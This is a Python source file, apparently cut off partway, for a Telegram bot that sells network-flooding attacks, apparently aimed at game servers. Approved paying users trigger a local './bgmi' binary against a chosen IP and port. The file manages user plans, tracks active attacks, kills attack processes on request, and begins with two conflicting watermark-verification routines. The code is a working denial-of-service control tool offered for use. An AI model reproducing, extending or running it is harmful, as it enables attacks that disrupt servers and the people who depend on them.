import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Watermark verification
CREATOR = "This File Is Made By @SahilModzOwner"
BotCode = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")

verify()
import hashlib

def verify():
    # Read the watermark text
    with open('developer.txt', 'r') as file:
        watermark_text = file.read().strip()

    # Compute the hash of the watermark
    computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()

    # Read the stored hash
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    # Check if the computed hash matches the stored hash
    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @SahilModzOwner.")
    print("This File Is Made By @SahilModzOwner.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Failed to kill process with PID {pid}: {e}")

# Buttons
btn_attack = telebot.types.KeyboardButton("Attack")
btn_start = telebot.types.KeyboardButton("START Attack")
btn_stop = telebot.types.KeyboardButton("Stop Attack")